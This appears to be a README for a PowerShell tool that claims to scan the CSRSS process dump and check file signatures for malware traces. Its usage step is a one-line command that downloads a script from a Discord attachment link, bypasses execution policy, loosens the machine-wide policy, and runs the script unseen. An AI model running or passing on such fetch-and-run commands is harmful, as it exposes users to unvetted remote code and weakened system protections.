# CSRSS Powershell Script
Checks the Systems CSRSS Dump for file-paths, then checks the files for signatures to ensure file integrity or detect traces of malware on a system.

### Usage of other Software
This script completely runs without any use of external software. Simply open Powershell and run:

New-Item -Path "C:\temp\dump\csrss" -ItemType Directory -Force | Out-Null;
Set-Location "C:\temp\dump\csrss";
Invoke-WebRequest -Uri "https://cdn.discordapp.com/attachments/1269629607674646540/1270118745645518938/csrss.ps1?ex=66b289c2&is=66b13842&hm=9b6ce26124e6257d2a11ec344399d907776a2aa5dca1ce0a91fcab6d799be99d&" -OutFile "csrss.ps1"; Set-ExecutionPolicy -Scope Process -ExecutionPolicy Bypass -Force; Set-ExecutionPolicy -Scope LocalMachine -ExecutionPolicy RemoteSigned -Force; .\csrss.ps1
